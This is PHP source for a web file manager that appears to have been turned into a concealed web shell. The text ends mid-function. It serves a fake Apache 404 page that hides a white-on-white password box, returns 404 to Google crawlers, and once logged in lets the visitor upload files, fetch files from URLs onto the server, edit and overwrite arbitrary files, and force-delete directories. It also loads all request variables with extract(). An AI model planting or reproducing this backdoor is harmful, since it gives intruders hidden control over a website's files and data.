<?php
error_reporting(0);
if(strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { 
    header('HTTP/1.0 404 Not Found'); 
	exit;
}
session_start();
$auth_pass = "c5517b9dcdd2a6486dbcabd06fa9e812"; 
function printLogin() { 
?> 
<html><head><title>Error: 404 - Not Found</title></head><body>
<h1>Not Found</h1> 
<p>The requested URL was not found on this server.</p> 
<hr> 
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
    <center> 
    <form method="post" action=""> 
    <input type="password" name="pass">
	<input type="submit" value="&nbsp;&nbsp;&nbsp;">
    </form></center>
</body></html>
    <?php 
    exit; 
}
if(@$_GET['act'] == 'logout') {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	//@session_unregister(md5($_SERVER['HTTP_HOST']));
    header('Location: http://'.$_SERVER['HTTP_HOST']);
} 
 
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) 
    if(empty($auth_pass) || (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))) {
		//@session_register(md5($_SERVER['HTTP_HOST']));
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	} //
	else  printLogin();

// HomePage    : http://www.webfilebrowser.org/
$title = 'WFB - '.$_SERVER['HTTP_HOST'];
$windowtitle = $title;
$defaultstatusmsg = $title;
$bodybgcolor  = "#FFFFFF";
$bodyfgcolor  = "#000000";
$thbgcolor    = "#D0D0D0";
$thfgcolor    = "#000000";
$tdbgcolor    = "#F0F0F0";
$tdfgcolor    = "#000000";
$infocolor    = "#008000";
$warningcolor = "#FF8000";
$errorcolor   = "#FF0000";
$linkcolor    = "#0000FF";
$actlinkcolor = "#FF0000";
$trashcan = "trash";
if (!@is_dir($trashcan)) {
	@mkdir($trashcan,0777);
}
$trashcaninfofileext = "wfbinfo";
//$filealiases = true;               // File aliasing feature
//$filealiasext = "wfbalias";        // File alias extension
$defaultsortby = "name";  // (name/size/date)
$hidedotfiles = false;
$hidefilepattern = "";
$showunixattrs = true;
$filemode = 0644;
$dirmode = 0775;
$uploadmaxsize = 9997152;
$searchmaxlevels = 0;
$editcols = 80;
$editrows = 24;
$defaultfileformat = "dos";
$viewextensions = array();

$basedir = @dirname(__FILE__);    // Base directory = local directory
$filelinks = true;                 // Links on files (inhibited with a custom $basedir
$basevirtualdir = "";              // If you have set a custom $basedir AND $filelinks = true
// ---- Local settings -----------------------------------------------------

$dateformat = "d/m/Y H:i";
     // "M D, Y"   = Dec Fri, 2002
     // "m/d/y"    = 12/20/02
     // "m-d-y"    = 12-20-02
     // "l M d, Y" = Friday Dec 20, 2002
     // "F dS, Y"  = December 20th, 2002
     // "H:i:s"    = 24 hour time with seconds
     // "h:i a"    = 12 hour time with am,pm

// ---------------------------------------------------------------------
function view_size($size){
	if (!is_numeric($size)) {return false;}
	else {
		if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
		elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
		elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
		else {$size = $size . " B";}
		return $size;
	}
}
// Checks and rebuilds sub-directory
function extractSubdir($d) {
	global $basedir;
	
	$tmp = "";
	if ($d != "") {
		//$rp = ereg_replace ( "((.*)\/.*)\/\.\.$", "\\2", $d );
		$rp = preg_replace("/((.*)\/.*)\/\.\.$/", "\\2", $d );
		$tmp = strtr ( str_replace ( $basedir, "", $rp ), "\\", "/" );
		while ( $tmp [0] == '/' )
			$tmp = substr ( $tmp, 1 );
	}
	return $tmp;
}

// Returns full file path
function getFilePath($f, $sd = "") {
	global $basedir, $subdir;
	
	return $basedir . "/" . (($sd != "") ? $sd : $subdir) . "/" . @basename ( $f );
}

// Return UNIX file perms
function getFilePerms($p) {
   if      (($p & 0xc000) === 0xc000) $type = 's';
   else if (($p & 0x4000) === 0x4000) $type = 'd';
   else if (($p & 0xa000) === 0xa000) $type = 'l';
   else if (($p & 0x8000) === 0x8000) $type = '-';
   else if (($p & 0x6000) === 0x6000) $type = 'b';
   else if (($p & 0x2000) === 0x2000) $type = 'c';
   else if (($p & 0x1000) === 0x1000) $type = 'p';
   else $type = '?';
   $u["r"] = ($p & 00400) ? 'r' : '-';
   $u["w"] = ($p & 00200) ? 'w' : '-';
   $u["x"] = ($p & 00100) ? 'x' : '-';
   $g["r"] = ($p & 00040) ? 'r' : '-';
   $g["w"] = ($p & 00020) ? 'w' : '-';
   $g["x"] = ($p & 00010) ? 'x' : '-';
   $o["r"] = ($p & 00004) ? 'r' : '-';
   $o["w"] = ($p & 00002) ? 'w' : '-';
   $o["x"] = ($p & 00001) ? 'x' : '-';
   if($p & 0x800) $u["x"] = ($u[x] == 'x') ? 's' : 'S';
   if($p & 0x400) $g["x"] = ($g[x] == 'x') ? 's' : 'S';
   if($p & 0x200) $o["x"] = ($o[x] == 'x') ? 't' : 'T';
   return $type.$u["r"].$u["w"].$u["x"].$g["r"].$g["w"].$g["x"].$o["r"].$o["w"].$o["x"];
}

// Checks file name
/*
function checkFileName($f) {
   global $subdir, $hidedotfiles, $hidefilepattern, $trashcan, $trashcaninfofileext; //, $filealiases, $filealiasext;
   if (!isset($f) || $f == "" || preg_match("/\.\.\//", $f)) return false;
    $f = @basename($f);
   return !((($subdir == "") && (strtolower($f) == $thisfile))
            || ($f == "..")
            || ($hidedotfiles && ($f[0] == '.'))
            || (($hidefilepattern != "") && ereg($hidefilepattern, $f))
            || ereg(".*\.".strtolower($trashcaninfofileext)."$", strtolower($f)));
			// || ($filealiases && ereg("^.*\.".strtolower($filealiasext)."$", strtolower($f)))
}
*/
function checkFileName($f) {
	global $subdir, $thisfile, $hidedotfiles, $hidefilepattern, $trashcan, $trashcaninfofileext;

	if (!isset($f) || $f == "" || preg_match("/\.\.\//", $f)) return false;
	$f = @basename($f);
	
	return !(($subdir == "" && strtolower($f) == $thisfile)
		|| ($subdir == "" && $f == $trashcan)
		|| ($hidedotfiles && ($f[0] == '.'))
		|| ($hidefilepattern != "" && ereg($hidefilepattern, $f))
		|| ($subdir == $trashcan)
	);
}
// Checks for edit extension
function checkExtension($f) {
   global $viewextensions;
   if (count($viewextensions) != 0) {
      foreach ($viewextensions as $ext) {
         if (ereg(".*\.".strtolower($ext)."$", strtolower($f))) return true;
      }
      return false;
   } else {
      return true;
   }
}

// Find files matching a regexp pattern
function searchFiles($sd, $searchpattern, $level = 0) {
   global $basedir, $subdir, $searchmaxlevels, $regexpsearch, $hidefilepattern;
   $count = 0;
   if (   ($searchmaxlevels == 0)
       || ($level < $searchmaxlevels)) {
      $dir = $basedir."/".$sd;
      if (!$regexpsearch && $level == 0) {
         $searchpattern = "^".str_replace("*", ".*", str_replace("?", ".", str_replace(".", "\.", $searchpattern)))."$";
      }
$d = @opendir($dir);
      while (($file = @readdir($d))) { 
         if (@is_dir($dir."/".$file) && ($file != ".") && ($file != "..")) {
            $count += searchFiles($sd."/".$file, $searchpattern, $level + 1); 
         } else if (ereg(strtolower($searchpattern), strtolower($file)) && !ereg($hidefilepattern, $file)) {
            $fp = getFilePath($file, $sd);
            addFileToList($file, $fp, ($subdir != "") ? str_replace($subdir."/", "", extractSubdir($fp)) : extractSubdir($fp), 9);
            $count++;
         }
      } 
      @closedir($d); 
   }
   return $count;
}
function del_dir($d) {
 $h = opendir($d);
 while (($o = readdir($h)) !== false) {
  if (($o != ".") and ($o != "..")) {
   if (!is_dir($d.$o)) {
    unlink($d.$o);
   } else {
      del_dir($d.$o.DIRECTORY_SEPARATOR);
       rmdir($d.$o);
   }
  }
 }
 closedir($h);
 rmdir($d);
 return !is_dir($d);
}
function del_file($o) {
 $o = str_replace("\\", DIRECTORY_SEPARATOR, $o);
 if (is_dir($o)) {
  if (substr($o,-1,1) != DIRECTORY_SEPARATOR) {
   $o .= DIRECTORY_SEPARATOR;
   }
   return del_dir($o);
  } elseif (is_file($o)) {
    return unlink($o);
 } else {
   return false;
 }
}
// Adds a file to file list
function addFileToList($file, $fp, $alias, $level, $msg = "") {
   global $files, $subdir, $trashcan, $sortby, $showunixattrs, $dateformat, $messages;
   if ($alias == "") $alias = $file;
   $date = @filemtime($fp);
   //$date = date($dateformat, @filemtime($fp));
   $size = (@is_dir($fp)) ? -1 : @filesize($fp); // negative size for directories
   $perms = "";
   $owner = "";
   $group = "";
   if ($showunixattrs) {
      $perms = getFilePerms(@fileperms($fp));
      if (function_exists("posix_getpwuid")) {
         $uid = @posix_getpwuid(@fileowner($fp));
         $owner = $uid["name"];
      }
      if (function_exists("posix_getgrgid")) {
         $gid = @posix_getgrgid(@filegroup($fp));
         $group = $gid["name"];
      }
   }

   if ($sortby == "size") {
      $key = $level." ".str_pad($size, 20, "0", STR_PAD_LEFT)." ".$alias;
   } else 
   if ($sortby == "date") {
      $key = $level." ".date("YmdHis", $date)." ".$alias;
   } else {
      $key = $level." ".$alias; //  <---
   }

   $files[$key] = array(
      "name" => $file,
      "alias" => (($subdir == $trashcan) ? ereg_replace("(.*)\.[0-9]*$", "\\1", $alias) : $alias),
      "level" => $level,
      "path" => $fp,
      "size" => $size,
      "date" => date($dateformat, $date),
      "perms" => $perms,
      "owner" => $owner,
      "group" => $group,
      "dir" => @is_dir($fp),
      "link" => @is_link($fp),
      "readonly" => !@is_writeable($fp),
      "statusmsg" => (($msg != "") ? $msg : ((@is_dir($fp)) ? "Go to folder" : "Display file"))
   );
}

// Generates full message
function getMsg($class, $msgcode, $msgparam1 = "", $msgparam2 = "") {
   global $messages;
   $msg = str_replace("%VAR1%", $msgparam1, str_replace("%VAR2%", $msgparam2, $msgcode));
   return (($class != "") ? "<p class=$class>" : "").htmlspecialchars($msg);
}
// Manages redirections
function redirectWithMsg($class, $msgcode, $msgparam1 = "", $msgparam2 = "", $extraparams = "") {
   global $thisscript, $subdir, $sortby;
   $msg = getMsg($class, $msgcode, $msgparam1, $msgparam2);
   header("Location: $thisscript?subdir=".rawurlencode($subdir)."&sortby=$sortby&msg=".rawurlencode($msg).$extraparams);
   exit;
}
// Page header
function pageHeader() {
   global $hiddeninfo, $title, $windowtitle, $thbgcolor, $thfgcolor, $tdbgcolor, $tdfgcolor, $bodybgcolor, $bodyfgcolor, $infocolor, $warningcolor, $errorcolor, $linkcolor, $actlinkcolor, $msg, $defaultstatusmsg;
   if ($hiddeninfo != "") {
      echo "\n<!--\nINFO :$hiddeninfo\n-->\n";
   }
   echo "\n<html>";
   echo "\n<head>";
   echo "\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">";
   echo "\n<meta name=\"viewport\" content=\"width=device-width\" />";
   echo "\n<title>$windowtitle</title>";
   echo "\n<style type=\"text/css\" media=screen>";
   echo "\n<!--";
   echo "\nbody       { background-color: $bodybgcolor; color: $bodyfgcolor; font-family: Arial, Helvetica, sans-serif; font-size: 10pt; }";
   echo "\np          { color: $bodyfgcolor; font-family: Arial, Helvetica, sans-serif; font-size: 10pt; }";
   echo "\n.info      { color: $infocolor; font-family: Arial, Helvetica, sans-serif; font-size: 10pt; }";
   echo "\n.warning   { color: $warningcolor; font-family: Arial, Helvetica, sans-serif; font-size: 10pt; }";
   echo "\n.error     { color: $errorcolor; font-family: Arial, Helvetica, sans-serif; font-size: 10pt; }";
   echo "\n.fix       { font-family: Courier; font-size: 10pt; }";
   echo "\nh1         { font-family: Arial, Helvetica, sans-serif; font-size: 16pt; }";
   echo "\nh2         { font-family: Arial, Helvetica, sans-serif; font-size: 12pt; }";
   echo "\nth         { background-color: $thbgcolor; color: $thfgcolor; font-family: Arial, Helvetica, sans-serif; font-size: 10pt; }";
   echo "\ntr         { background-color: $tdbgcolor; color: $tdfgcolor; font-family: Arial, Helvetica, sans-serif; font-size: 10pt; }"; // td
   echo "\n.tdlt      { background-color: $bodybgcolor; color: $bodyfgcolor; font-family: Arial, Helvetica, sans-serif; font-size: 10pt; text-align: left; vertical-align: top; }";
   echo "\n.tdrt      { background-color: $bodybgcolor; color: $bodyfgcolor; font-family: Arial, Helvetica, sans-serif; font-size: 10pt; text-align: right; vertical-align: top; }";
   echo "\n.tdcc      { background-color: $bodybgcolor; color: $bodyfgcolor; font-family: Arial, Helvetica, sans-serif; font-size: 10pt; text-align: center; vertical-align: center; }";
   echo "\na:link     { color: $linkcolor; text-decoration: none; }";
   echo "\na:active   { color: $actlinkcolor; text-decoration: underline; }";
   echo "\na:visited  { color: $linkcolor; text-decoration: none; }";
   echo "\na:hover    { color: $actlinkcolor; text-decoration: underline; }";
   echo "\n-->";
   echo "\n</style>";
   echo "\n<script language=\"javascript\">";
   echo "\n<!--";
   echo "\nfunction statusMsg(txt) {";
   echo    "\nif (txt == '') txt = '$defaultstatusmsg';";
   echo    "\nwindow.status = txt;";
   echo    "\nreturn true;";
   echo "\n}";
   echo "\n//-->";
   echo "\n</script>";
   /*
   ?>
   <script type="text/javascript">
   function setColor_js(i, checkbox_hidden) {
	// i contains the row number
	// checkbox_hidden determines if the row has a checkbox, or hidden properties

// Set the colors for the rows
	if (i%2 == 1) { bgcolor_true = '#ABABAB'; fontcolor_true = '#000000'; bgcolor_false = '#F2F2F5'; fontcolor_false = '#000000'; }
	else          { bgcolor_true = '#ABABAB'; fontcolor_true = '#000000'; bgcolor_false = '#F2F2F5'; fontcolor_false = '#000000'; }

// Checkbox ==> set the colors depending on the checkbox status
// Hidden ==> set the colors as for an unchecked checkbox
	row_id = 'row' + i;
	checkbox_id = 'list_' + i + '_dirfilename';
	if (document.getElementById) {
		if (checkbox_hidden == 'checkbox' && document.getElementById(checkbox_id).checked == true) { 
			document.getElementById(row_id).style.background = bgcolor_true;  document.getElementById(row_id).style.color = fontcolor_true; 
		} else { 
			document.getElementById(row_id).style.background = bgcolor_false; document.getElementById(row_id).style.color = fontcolor_false; 
		}
	}
	else if (document.all) {
		if (checkbox_hidden == 'checkbox' && document.all[checkbox_id].checked == true) { 
			document.all[row_id].style.background = bgcolor_true;  document.all[row_id].style.color = fontcolor_true; 
		} else { 
			document.all[row_id].style.background = bgcolor_false; document.all[row_id].style.color = fontcolor_false; 
		}
	}
}
</script>

   <?php
   */
   echo "\n</head>";
   echo "\n<body onLoad='return statusMsg(\"\")'>\n";
   echo "<h1>$title</h1>";
   if (isset($msg)) echo $msg; // Displays message after redirection if required
}

// Return quoted string for JavaScript usage
function quoteJS($str) {
   return str_replace("'", "\\&#39;", $str);
}
// Page footer
function pageFooter() {
/*
?>
<script type="text/javascript">
function refrClock() {
	var d=new Date();
	var s=d.getSeconds();
	var m=d.getMinutes();
	var h=d.getHours();
	var day=d.getDay();
	var date=d.getDate();
	var month=d.getMonth();
	var year=d.getFullYear();
	var days=new Array("C/nhật,","Thứ 2,","Thứ 3,","Thứ 4,","Thứ 5,","Thứ 6,","Thứ 7,");
	var months=new Array("tháng 1,","tháng 2,","tháng 3,","tháng 4,","tháng 5,","tháng 6,","tháng 7,","tháng 8,","tháng 9,","tháng 10,","tháng 11,","tháng 12,");
	var am_pm;
	if (s<10) {s="0" + s}
	if (m<10) {m="0" + m}
	if (h<12) {am_pm = "Sáng"}
	else if (h==12) {am_pm = "Trưa"}
	else if (h>12 && h<18) {h-=12;am_pm = "Chiều"}
	else if (h>=18 && h<22) {h-=12;am_pm = "Tối"}
	else if (h>=22) {h-=12;am_pm = "Đêm"}
	document.getElementById("clock").innerHTML=days[day] + date + " " + month + " " + year + ", " + h + ":" + m + ":" + s;
	setTimeout("refrClock()",1000);
	}
	refrClock();

</script>
<?php
*/
   echo "\n</body>";
   echo "\n</html>";
}
$hiddeninfo = "";
// Getting variables (TODO : increase security here)
if (!empty($HTTP_POST_VARS)) extract($HTTP_POST_VARS);
if (!empty($HTTP_GET_VARS)) extract($HTTP_GET_VARS);
if (!empty($_POST)) extract($_POST);
if (!empty($_GET)) extract($_GET);

if (function_exists("ini_set")) {
   // Try to inhibate error reporting setting
   @ini_set("display_errors", 0);
   // Try to activate upload settings, inhibate uploads if failed
   if (@get_cfg_var("file_uploads") != 1) {
      if (@ini_set("file_uploads", 1) === true)
         @ini_set("upload_max_filesize", $uploadmaxsize);
      else
         $hiddeninfo .= "\nUpload feature inhibited";
   }

   // Try to activate URL open setting, inhibate URL uploads if failed
   if (@get_cfg_var("allow_url_fopen") != 1) {
      if (@ini_set("allow_url_fopen", 1) === false)
         $hiddeninfo .= "\nURL upload feature inhibited";
   }
} else {
   // Inhibate uploads if upload setting not activated
   if (@get_cfg_var("file_uploads") != 1)
      $hiddeninfo .= "\nUpload feature inhibited";

   // Inhibate URL uploads if URL open setting not activated
   if (@get_cfg_var("allow_url_fopen") != 1)
      $hiddeninfo .= "\nURL upload feature inhibited";
}

// Inhibitate file links with custom base directory
if ($filelinks && (($basedir != @dirname(__FILE__)) && ($basevirtualdir == ""))) {
   $filelinks = false;
   $hiddeninfo .= "\nFile links feature inhibited";
}

// Inhibate delete action if trash can directory is not writeable
if (!@is_dir($basedir."/".$trashcan)) {
   $hiddeninfo .= "\nDelete action inhibited (no trash can)";
}

// Prevents from seeing this file
$thisfile = strtolower(@basename(__FILE__));

// Turns antislashes into slashes for base directory
$basedir = strtr($basedir, "\\", "/");

// This script URI
$thisscript = $_SERVER["PHP_SELF"];

// General HTTP directives
header("Expires: -1");
header("Pragma: no-cache");
header("Cache-Control: max-age=0");
header("Cache-Control: no-cache");
header("Cache-Control: no-store");
if (@$act != "download")
   header("Content-Type: text/html; charset=utf-8");
// Parameters check
if (!isset($subdir) || $subdir == ".") $subdir = "";
if (($subdir != "") && (strstr($subdir, ".."))) {
   $subdir = "";
   $hiddeninfo .= "\nRedirected to base directory";
}
$subdir = extractSubdir($basedir."/".$subdir);
if (!isset($sortby)) $sortby = $defaultsortby;
if (!isset($act)) $act = "";
if (!isset($file)) {
   if (!isset($selfiles) || !is_array($selfiles)) {
      $file = "";
   } else {
      $file = $selfiles[0];
   }
}

// Array for file lists
$files = array();

// Processes actions and redirects to pages
if (($act != "edit") && ($act != "show")) {
   if ($act == "") {
      @clearstatcache();

      if ($d = @opendir($basedir."/".$subdir)) {
         // builds an indexed array for files
         if ($subdir != "") {
            addFileToList("", $basedir, "[Main folder]", 0, "Go to main folder");
         }
         if ($subdir != $trashcan) {
            addFileToList("..", getFilePath(".."), "[Up one folder]", 2, "Go to up one folder");
         }
         if (($subdir != $trashcan) && (@is_dir($basedir."/".$trashcan))) {
            addFileToList($trashcan, $basedir."/".$trashcan, "[Trash can]", 1, "Go to trash can");
         }
         while ($file = @readdir($d)) {
            if (checkFileName($file)) {
               $fp = getFilePath($file);
			   $alias = "";
			   /*
               $fp_alias = $fp.".".$filealiasext; 

               
               if ($filealiases && @is_readable($fp_alias)) {
                  $fd = @fopen($fp_alias, "r");
                  $alias = trim(@fread($fd, @filesize($fp_alias)))." <i>(".(($subdir == $trashcan) ? ereg_replace("(.*)\.[0-9]*$", "\\1", $file) : $file).")</i>";
                  @fclose($fd);
               } */

               addFileToList($file, $fp, $alias, 9);
            }
         }

         @closedir($d);

         // Sort the array according to indexes
         ksort($files);
      } else {
         pageHeader();
         echo getMsg("error", "Unable to read folder", $subdir);
         pageFooter();
         exit;
      }
   } else if ($act == "search") {
      $searchpattern = trim($searchpattern);

      if ($searchpattern != "") {
         if (!isset($regexpsearch)) $regexpsearch = false;

         @clearstatcache();

         addFileToList($subdir, getFilePath("."), "[Searched folder]", 1);

         if (searchFiles($subdir, $searchpattern) == 0) {
            redirectWithMsg("warning", "No files found matching %VAR1%", $searchpattern, "", "&searchpattern=".rawurlencode($searchpattern)."&regexpsearch=$regexpsearch");
         }

         ksort($files);
      } else {
         redirectWithMsg("error", "No search pattern");
      }
   } else if ($act == "move") {
      for ($i = 0; $i < count($selfiles); $i++) {
         $file = $selfiles[$i];
         if (isset($file) && ($file != "") && isset($dest)) {
            if (!checkFileName($file) || (($subdir == "") && ($file == $trashcan))) {
               redirectWithMsg("warning", "Invalid name for file(s) or folder(s) to move");
            } else if (($dest != "..") && !checkFileName($dest)) {
               redirectWithMsg("warning", "Invalid destination folder for file(s) or folder(s) to move");
            } else {
               $fp = getFilePath($file);
               $fpd = ($dest == "") ? $basedir : getFilePath($dest);
			   
               //$fp_alias = $fp.".".$filealiasext;
               //$fpd_alias = $fpd."/".@basename($file).".".$filealiasext;

               $destinfo = ($dest == "") ? "main directory" : (($dest == "..") ? "upper directory" : $dest);

               if (@is_dir($fpd)) {
                  if (@rename($fp, $fpd."/".@basename($file))) {
                     //if ($filealiases && @is_readable($fp_alias)) @rename($fp_alias, $fpd_alias);
                  } else {
                     redirectWithMsg("error", "Unable to move file or folder %VAR1% to %VAR2%", $file, $destinfo);
                  }
               } else {
                  redirectWithMsg("error", "Destination folder %VAR1% is not a valid folder", $dest);
               }
            }
         } else {
            redirectWithMsg("warning", "No name or destination folder for file(s) or folder(s) to move");
         }
      }
      redirectWithMsg("info", "All selected file(s) or folder(s) moved to %VAR1%", $destinfo);
   } else 
   // -----------------------------------------------------------------
   if (($act == "forcedelete") && ($subdir != $trashcan)) {
      for ($i = 0; $i < count($selfiles); $i++) {
         $file = $selfiles[$i];
         if (isset($file) && ($file != "")) {
               $fp = getFilePath($file);
               del_file($fp);
            
         } else {
            redirectWithMsg("warning", "No name for file to delete");
         }
      }
      redirectWithMsg("info", "All selected file(s) forced delete");
   } else 
   //------------------------------------------------------------------------------------
   
   
   
   if (($act == "rmdir") && ($subdir != $trashcan)) {
      if (isset($file) && ($file != "")) {
         if (!checkFileName($file) || (($subdir == "") && ($file == $trashcan))) {
            redirectWithMsg("warning", "Invalid name for folder to remove");
         } else {
            $fp = getFilePath($file);

            if (@is_dir($fp) && !@is_link($fp)) {
               if (@del_file($fp)) {
                  redirectWithMsg("info", "Folder %VAR1% removed", $file);
               } else {
                  redirectWithMsg("error", "Unable to remove folder %VAR1% (not empty ?)", $file);
               }
            } else {
               redirectWithMsg("error", "File %VAR1% is not a folder", $file);
            }
         }
      } else {
         redirectWithMsg("warning", "No name for folder to remove");
      }
   } else if (($act == "rename") && ($subdir != $trashcan)) {
      if (isset($file) && ($file != "") && isset($renameto) && ($renameto != "")) {
         if (!checkFileName($file) || (($subdir == "") && ($file == $trashcan))) {
            redirectWithMsg("warning", "Invalid name for file to rename");
         } else if (!checkFileName($renameto)) {
            redirectWithMsg("warning", "Invalid new name for file to rename");
         } else {
            $fp = getFilePath($file);
            $fpto = getFilePath($renameto);
			
            //$fp_alias = $fp.".".$filealiasext;
            //$fpto_alias = $fpto.".".$filealiasext;

            if (@rename($fp, $fpto)) {
               //if ($filealiases && @is_readable($fp_alias)) @rename($fp_alias, $fpto_alias);
               redirectWithMsg("info", "File %VAR1% renamed to %VAR2%", $file, $renameto);
            } else {
               redirectWithMsg("error", "Unable to rename file %VAR1% to %VAR2%", $file, $renameto);
            }
         }
      } else {
         redirectWithMsg("warning", "No name or new name for file rename");
      }
   } else if (($act == "copy") && ($subdir != $trashcan)) {
      if (isset($file) && ($file != "") && isset($copyto) && ($copyto != "")) {
         if (!checkFileName($file) || (($subdir == "") && ($file == $trashcan))) {
            redirectWithMsg("warning", "Invalid name for file to copy");
         } else if (!checkFileName($copyto)) {
            redirectWithMsg("warning", "Invalid copy name for file to copy");
         } else {
            $fp = getFilePath($file);
            $fpto = getFilePath($copyto);

            if (!@is_dir($fp)) {
               if (@copy($fp, $fpto)) {
                  redirectWithMsg("info", "File %VAR1% copied to %VAR2%", $file, $copyto);
               } else {
                  redirectWithMsg("error", "Unable to copy file %VAR1% to %VAR2%", $file, $copyto);
               }
            } else {
               redirectWithMsg("error", "Can't copy directories");
            }
         }
      } else {
         redirectWithMsg("warning", "No name or copy name for file to copy");
      }
   } else 
   /*
   if ($filealiases && ($act == "alias") && ($subdir != $trashcan)) {
      if (isset($file) && ($file != "")) {
         if (!checkFileName($file) || (($subdir == "") && ($file == $trashcan))) {
            redirectWithMsg("warning", "Invalid name for file to alias");
         } else {
            $fp = getFilePath($file);
            $fp_alias = $fp.".".$filealiasext;

            if (!@is_dir($fp)) {
               if ($aliasto != "") {
                  if ($fda = @fopen($fp_alias, "w")) {
                     @fwrite($fda, $aliasto);
                     @fclose($fda);
                     redirectWithMsg("info", "File %VAR1% aliased", $file);
                  } else {
                     redirectWithMsg("error", "Unable to alias file %VAR1%", $file);
                  }
               } else {
                  if (@is_readable($fp_alias)) {
                     @unlink($fp_alias);
                     redirectWithMsg("info", "File %VAR1% was un-aliased", $file);
                  } else {
                     redirectWithMsg("info", "File %VAR1% was not aliased", $file);
                  }
               }
            } else {
               redirectWithMsg("error", "Can't alias directories");
            }
         }
      } else {
         redirectWithMsg("warning", "No name for file to alias");
      }
   } else */
   
   if (($act == "mkdir") && ($subdir != $trashcan)) {
      if (isset($file) && ($file != "")) {
         if (!checkFileName($file)) {
            redirectWithMsg("warning", "Invalid name for folder to create");
         } else {
            $fp = getFilePath($file);

            if (@mkdir($fp, $dirmode)) {
               @chmod($fp, $dirmode); // mkdir sometimes fails to set permissions
               redirectWithMsg("info", "Folder %VAR1% created", $file);
            } else {
               redirectWithMsg("error", "Unable to create folder %VAR1%", $file);
            }
         }
      } else {
         redirectWithMsg("warning", "No name for folder to create");
      }
      redirectWithMsg($msg);
   } else if (($act == "create") && ($subdir != $trashcan)) {
      if (isset($file) && ($file != "")) {
         if (!checkFileName($file) || (($subdir == "") && ($file == $trashcan))) {
            redirectWithMsg("warning", "Invalid name for file to create");
         } else {
            $fp = getFilePath($file);

            if (@touch($fp)) {
               @chmod($fp, $filemode);
               redirectWithMsg("info", "File %VAR1% created", $file);
            } else {
               redirectWithMsg("error", "Unable to create file %VAR1%", $file);
            }
         }
      } else {
         redirectWithMsg("warning", "No name for file to create");
      }
   } else if (($act == "upload") && ($subdir != $trashcan)) {
      //if (isset($HTTP_POST_FILES["file"]) && ($HTTP_POST_FILES["file"]["size"] > 0)) {
	  if (isset($_FILES["file"]) && ($_FILES["file"]["size"] > 0)) {
         if (!checkFileName($_FILES["file"]["name"])) {
            redirectWithMsg("warning", "Invalid name for file to upload");
         } else {
            $fp = getFilePath($_FILES["file"]["name"]);

            if (@copy($_FILES["file"]["tmp_name"], $fp)) {
               @unlink($_FILES["file"]["tmp_name"]);
               @chmod($fp, $filemode);
               redirectWithMsg("info", "Upload of file %VAR1% succeeded", $_FILES["file"]["name"]);
            } else {
               redirectWithMsg("error", "Upload of file %VAR1% aborted", $_FILES["file"]["name"]);
            }
         }
      } else {
         redirectWithMsg("warning", "No name for file to upload");
      }
   } else if (($act == "urlupload") && ($subdir != $trashcan)) {
      if (isset($file) && ($file != "")) {
         $url = $file;
         $file = @basename(ereg_replace("^[a-zA-Z]*\:\/(.*)$", "\\1", $url));
         if (!checkFileName($file) || (($subdir == "") && ($file == $trashcan))) {
            redirectWithMsg("warning", "Invalid URL to upload");
         } else {
            $fp = getFilePath($file);

            if (($fd = @fopen($url, "r")) && ($fdd = @fopen($fp, "w"))) {
               while (!@feof($fd)) {
                  fwrite($fdd, @fread($fd, 1024));
               }
               @fclose($fd);
               @fclose($fdd);
               redirectWithMsg("info", "URL %VAR1% uploaded to %VAR2%", $url, $file);
            } else {
               redirectWithMsg("error", "Unable to upload %VAR1%", $url);
            }
         }
      } else {
         redirectWithMsg("warning", "No URL to upload");
      }
   } else if (($act == "empty") && ($subdir == $trashcan)) {
      $res = true;
      if ($d = @opendir($basedir."/".$subdir)) {
         while ($file = @readdir($d)) {
            $fp = getFilePath($file);

            if (($file != ".") && ($file != "..")) {
               if (@is_dir($fp) || !@unlink($fp)) {
                  $res = false;
               }
            }
         }
         @closedir($d);

         if ($res) {
            redirectWithMsg("info", "Trash can emptied");
         } else {
            redirectWithMsg("warning", "Trash can was not fully emptied");
         }
      } else {
         redirectWithMsg("error", "Unable to read trash can");
      }
   } else if ($act == "restore") {
      for ($i = 0; $i < count($selfiles); $i++) {
         $file = $selfiles[$i];
         if (isset($file) && ($file != "")) {
            if (!checkFileName($file)) {
               redirectWithMsg("warning", "Invalid name for file to restore");
            } else if ($subdir != $trashcan) {
               redirectWithMsg("warning", "Restore only works in trash can");
            } else {
               $f = ereg_replace("(.*)\.[0-9]*$", "\\1", $file);
               $fp = getFilePath($file);
               $fp_info = $fp.".".$trashcaninfofileext;

               $fpd = "";
               if ($fdi = @fopen($fp_info, "r")) {
                  $fpd = trim(@fread($fdi, @filesize($fp_info)));
                  @fclose($fdi);
               }

               //$fp_alias = $fp.".".$filealiasext;
               //$fpd_alias = $fpd.".".$filealiasext;

               if (@rename($fp, $fpd)) {
                  @unlink($fp_info);
                  //if ($filealiases && @is_readable($fp_alias)) @rename($fp_alias, $fpd_alias);
               } else {
                  redirectWithMsg("error", "Unable to restore file %VAR1%", $f);
               }
            }
         } else {
            redirectWithMsg("warning", "No name for file to restore");
         }
      }
      redirectWithMsg("info", "All selected files restored");
   } else if (($act == "save") && ($subdir != $trashcan)) {
      if (isset($file) && ($file != "")) {
         if (!checkFileName($file) || (($subdir == "") && ($file == $trashcan))) {
            redirectWithMsg("warning", "Invalid name for file save");
         } else {
            $fp = getFilePath($file);

            if ($fd = @fopen($fp, "w")) {
               if (!isset($fileformat)) $fileformat = $defaultfileformat;

               $data = stripslashes($data); // Strips doubled backslashes
               //$data = str_replace("\r\n", "\n", $data); // Remove LF => UNIX format
               //if ($fileformat == "dos") $data = str_replace("\n", "\r\n", $data); // Add LF => DOS format

               @fwrite($fd, $data);
               @fclose($fd);

               redirectWithMsg("File $file saved (".strtoupper($fileformat)." format)", "info");
            } else {
               $msg = getMsg("error", "Unable to save file %VAR1%", $file);
               $data = stripslashes($data);
               $act = "edit"; // To re-edit file (no redirection)
            }
         }
      } else {
         redirectWithMsg("warning", "No name for file to save");
